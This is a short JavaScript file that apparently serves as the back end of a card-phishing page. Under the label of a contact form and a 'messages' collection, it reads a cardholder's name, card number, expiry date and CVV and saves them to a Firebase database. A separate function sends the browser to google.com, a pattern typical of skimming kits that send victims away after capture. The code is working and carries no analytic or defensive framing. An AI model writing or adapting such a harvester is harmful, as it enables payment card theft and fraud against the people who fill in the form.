

//reference messages collection
var messagesRef = firebase.database().ref('messages');

//listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

//submit form

function submitForm(e){
	e.preventDefault();
	
	//get values
	var cname= getInputVal('cname');
	var ccnum= getInputVal('ccnum');
	var expmonth= getInputVal('expmonth');
	var expyear= getInputVal('expyear');
	var cvv= getInputVal('cvv');
	
	//save message
	saveMessage(cname, ccnum, expmonth, expyear, cvv);
}

//functions to get form values
function getInputVal(id){
	return document.getElementById(id).value;
}

//save messages to firebase
function saveMessage(cname, ccnum, expmonth, expyear, cvv){
	var newMessageRef = messagesRef.push();
	newMessageRef.set({ 
	cname: cname,
	ccnum: ccnum,
	expmonth: expmonth,
	expyear: expyear,
	cvv: cvv
	
	});
}

function myFunction() {
		  window.location.href="http://google.com";
		  }


